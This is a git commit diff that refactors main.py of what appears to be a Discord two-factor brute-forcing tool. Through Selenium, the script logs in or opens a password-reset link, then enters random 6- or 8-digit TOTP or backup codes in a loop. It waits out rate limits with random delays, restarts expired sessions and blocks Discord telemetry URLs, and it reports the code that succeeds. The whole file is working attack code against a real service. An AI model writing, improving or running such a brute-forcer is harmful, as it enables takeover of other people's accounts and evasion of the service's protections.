9d38bc58c9f53c0dbb1cc6e90617d1e3050730a0
LuXeZs <49080760+LuXeZs@users.noreply.github.com>
2023-03-02 10:04:30 +0000

    Cleaned up the code [Update main.py]

--- src/main.py
+++ src/main.py
@@ -1,8 +1,8 @@
 # Import dependencies and libraries
 import os
 import time
-from dotenv import load_dotenv
 import secrets
+from dotenv import load_dotenv, find_dotenv
 from lib.codegen import genNormal, genBackup
 from lib.textcolor import toColor
 
@@ -16,7 +16,7 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
 
 # Load in the credentials from .env
-load_dotenv()
+load_dotenv(find_dotenv())
 
 # Set the email and password variables from the environment variables
 email = os.getenv('EMAIL')
@@ -24,9 +24,24 @@ password = os.getenv('PASSWORD')
 token = os.getenv('TOKEN')
 newpassword = os.getenv('NEWPASSWORD')
 
-def totp(gen):
+def main(mode,code):
+	# Chromium oprions.
+	options = Options()
+	options.add_argument('--log-level=1')
+	options.add_experimental_option("excludeSwitches", ["enable-logging"])
+	# Sets what page to use.
+	match mode:
+		case "OTP":
+			# OTP login
+			dispage = "https://www.discord.com/login"
+		case "PR":
+			# Password reset page
+			options.add_argument('--headless')
+			dispage = "https://discord.com/reset#token=" + token
+		case _:
+			print(toColor("ERROR","red") + ": Set Page")
 	# Get the Chromium web driver
-	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
+	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
 	#Blocking cloudflare and discord science URLS so they don't phone home
 	driver.execute_cdp_cmd('Network.setBlockedURLs', {
 		"urls": [
@@ -37,54 +52,72 @@ def totp(gen):
 	})
 	# Enable the network connectivity of the browser
 	driver.execute_cdp_cmd('Network.enable', {})
-	# Go to the discord login page
-	driver.get("https://www.discord.com/login")
-	options = webdriver.ChromeOptions() 
-	# Clean up the program log
-	options.add_experimental_option("excludeSwitches", ["enable-logging"])
+	# Go to the discord page
+	driver.get(dispage)
 	# Wait 1 second before typing the email and password
 	time.sleep(1)
+	match mode:
+		case "OTP":
+			# Find the email and password login fields
+			loginEmail = driver.find_element(by=By.NAME, value="email")
+			loginPassword = driver.find_element(by=By.NAME, value="password")
+			# Enter the email and password
+			loginEmail.send_keys(email)
+			loginPassword.send_keys(password)
+			# TOTP login field location
+			element = "//*[@aria-label='Enter Discord Auth/Backup Code']"
+		case "PR":
+			# Find the new password field
+			loginPassword = driver.find_element(by=By.NAME, value="password")
+			# Enter the new password
+			loginPassword.send_keys(newpassword)
+			# Password reset field location
+			element = "/html/body/div[2]/div[2]/div[1]/div[1]/div/div/div/form/div[2]/div[2]/div/div/input"
+		case _:
+			print(toColor("ERROR","red") + ": Set Mode")
 
-	# Find the email and password login fields
-	loginEmail = driver.find_element(by=By.NAME, value="email")
-	loginPassword = driver.find_element(by=By.NAME, value="password")
-	# Enter the email and password
-	loginEmail.send_keys(email)
-	loginPassword.send_keys(password)
 	# Click Enter/Return to enter the password
 	loginPassword.send_keys(Keys.RETURN)
 	# Set up the statistics variables
 	totpCount = 0
 	ratelimitCount = 0
 
-	# Set the ammount of charaters to backspace from previously entered TOTP code.
-	if gen == genBackup:
-		clear = 9
-	else:
-		clear = 6
+	# Sets the code generate mode and the ammount of charaters to backspace from previously entered TOTP code.
+	match code:
+		case 6:
+			clear = 6
+			gen = genNormal
+		case 8:
+			clear = 9
+			gen = genBackup
+		case _:
+			print(toColor("ERROR","red") + ": Code Generate Mode")
 
 	#loginTOTP = otp input field. TOTP stands for Timed One Time Password
 	# Constantly run the script
 	while (True):
 		# Attempt to find the TOTP login field
 		try:
-			loginTOTP = driver.find_element(by=By.XPATH, value="//*[@aria-label='Enter Discord Auth/Backup Code']")
+			loginTOTP = driver.find_element(by=By.XPATH, value=element)
 			time.sleep(0.5)
 			start = time.time()
 			sleepy = 0
+
 			#Logic to continuously enter OTP codes
 			while (True):
-				# Generate a new 8 or 6 digit number and enter it into the TOTP field
-				totp = gen(1)
-				loginTOTP.send_keys(totp)
-				loginTOTP.send_keys(Keys.RETURN)
-				totpCount += 1
-
+				# Inform user TOTP field was found
+				if totpCount == 0:
+					print("TOTP login field: " + toColor("Found","green"))
+					print("Forcer: " + toColor("Starting","green"))
 				#Test for ratelimit
 				if ("The resource is being rate limited." in driver.page_source):
 					print(toColor("Ratelimited.", "yellow"))
 					sleepy = secrets.choice(range(7, 12))
 					ratelimitCount += 1
+					# Wait for delay
+					time.sleep(sleepy)
+					# Retry code that was ratelimited
+					loginTOTP.send_keys(Keys.RETURN)
 				# This means that Discord has expired this login session.
 				elif ("Invalid two-factor auth ticket" in driver.page_source):
 					# This means that Discord has expired this login session.
@@ -114,135 +147,48 @@ def totp(gen):
 					for i in range(clear):
 						loginTOTP.send_keys(Keys.BACKSPACE)
 
-					print("Code " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
-				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha, then try again
-		except (NoSuchElementException):
-			pass
-
-
-def reset(gen):
-	# Get the Chromium web driver.
-	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
-	#Blocking cloudflare, sentry.io and discord science URLS (analytics and monitoring URLS)
-	driver.execute_cdp_cmd('Network.setBlockedURLs', {
-		"urls": [
-			"a.nel.cloudflare.com/report", 
-			"https://discord.com/api/v9/science",
-			"sentry.io"
-		]
-	})
-	# Enable the network connectivity of the browser
-	driver.execute_cdp_cmd('Network.enable', {})
-	# Go to the discord login page
-	driver.get("https://discord.com/reset#token=" + token) 
-	# Set up the statistics variables
-	totpCount = 0
-	ratelimitCount = 0
-
-	# Set the password variable from the environment variables
-	loginPassword = driver.find_element(by=By.NAME, value="password")
-	loginPassword.send_keys(newpassword)
-	loginPassword.send_keys(Keys.RETURN)
-
-	# Set the ammount of charaters to backspace from previously entered TOTP code.
-	if gen == genBackup:
-		clear = 9
-	else:
-		clear = 6
-
-	# Constantly run the script
-	while (True):
-
-		# Attempt to find the TOTP login field
-		try:
-			loginTOTP = driver.find_element(by=By.XPATH, value="/html/body/div[2]/div[2]/div[1]/div[1]/div/div/div/form/div[2]/div[2]/div/div/input")
-			time.sleep(0.5)
-			start = time.time()
-			sleepy = 0
-
-			#Logic to continuously enter OTP codes
-			while (True):
-
-				# Generate a new 8 or 6 digit number and enter it into the TOTP field
-				totp = gen(1)
-				loginTOTP.send_keys(totp)
-				loginTOTP.send_keys(Keys.RETURN)
-				totpCount += 1
-
-				#Test if Discord ratelimits us
-				if ("The resource is being rate limited." in driver.page_source):
-					# Log the ratelimit event and wait 10-20 seconds randomly
-					print(toColor("Ratelimited.", "yellow"))
-					sleepy = secrets.choice(range(10, 20))
-					ratelimitCount += 1
-
-				# This means that Discord has expired this login session.
-				elif ("Invalid two-factor auth ticket" in driver.page_source):
-					# This means that Discord has expired this login session.
-					#  Print this out as well as some statistics, and prompt the user to retry.
-					elapsed = time.time() - start
-					print(toColor("Invalid session ticket. The Discord login session has expired, try to run the program again.", "red"))
-					print(toColor(f"Number of tried codes this session: {totpCount}", "blue"))
-					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
-					print(toColor(f"Number of ratelimits this session: {ratelimitCount}", "blue"))
-					# Close the browser.
-					driver.close()
-					time.sleep(1)
-					# Restart and reopen the browser.
-					reset(gen)
-
-				# The entered TOTP code is invalid. Wait 10-20 seconds, then try again.
-				else:
-					sleepy = secrets.choice(range(10, 20))
-				#Testing if the main app UI renders.
-				try:
-					# Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
-					time.sleep(1)
-					loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
-					print(toColor(f"Code {totp} worked!"))
-					break
-				except NoSuchElementException:
-					# This means that the login was unsuccessful.
-					time.sleep(sleepy)
-					# Backspace the previously entered TOTP code.
-					for i in range(clear):
-						loginTOTP.send_keys(Keys.BACKSPACE)
+					# Generate a new 8 or 6 digit number and enter it into the TOTP field
+					totp = gen(1)
+					loginTOTP.send_keys(totp)
+					loginTOTP.send_keys(Keys.RETURN)
+					totpCount += 1
 
 					print("Code: " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
-
-		# If the TOTP login field is not found (e.g the user hasn't supplied new password) then try again.
+				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha/entered a new password, then try again
 		except (NoSuchElementException):
 			pass
 
+
 if __name__ == "__main__":
+	# Ask the user what they want to do
 	try:
-		# Asks user if they're trying a password reset. 
 		menu = int(input(toColor("Are you trying a password reset?\n[1] - Yes\n[2] - No\n ", "blue")))
-		if menu == 1:
-			# Check what type of code the user would like to generate.
-			t = int(input(toColor("What type of code would you like to generate?\n[1] - 8 Digit Backup Code\n[2] - 6 Digit Normal Code\n ", "blue")))
-			# Set the code generator to 8 Digit Backup Code.
-			if t == 1:
-				gen = genBackup
-				reset(gen)
-			# Set the code generator to 6 Digit Normal Code.
-			elif t == 2:
-				gen = genNormal
-				reset(gen)
-		elif menu == 2:
-			# Check what type of code the user would like to generate.
-			t = int(input(toColor("What type of code would you like to generate?\n[1] - 8 Digit Backup Code\n[2] - 6 Digit Normal Code\n ", "blue")))
-			# Set the code generator to 8 Digit Backup Code.
-			if t == 1:
-				gen = genBackup
-				totp(gen)
-			# Set the code generator to 6 Digit Normal Code.
-			elif t == 2:
-				gen = genNormal
-				totp(gen)
-		else:
-			print("Invalid option entered!")
+		match menu:
+			case 1:
+				mode = "PR"
+				t = int(input(toColor("What type of code would you like to generate?\n[1] - 8 Digit Backup Code\n[2] - 6 Digit Normal Code\n ", "blue")))
+				match t:
+					case 1:
+						code = 8
+					case 2:
+						code = 6
+					case _:
+						print("Invalid option entered!")	
+				main(mode,code)			
+			case 2:
+				mode = "OTP"
+				t = int(input(toColor("What type of code would you like to generate?\n[1] - 8 Digit Backup Code\n[2] - 6 Digit Normal Code\n ", "blue")))
+				match t:
+					case 1:
+						code = 8
+					case 2:
+						code = 6
+					case _:
+						print("Invalid option entered!")
+				main(mode,code)	
+			case _:
+				print("Invalid option entered!")
 			
 	except BaseException as ex:
 		if isinstance(ex, SystemExit) or isinstance(ex, KeyboardInterrupt):
-			quit()
+				quit()
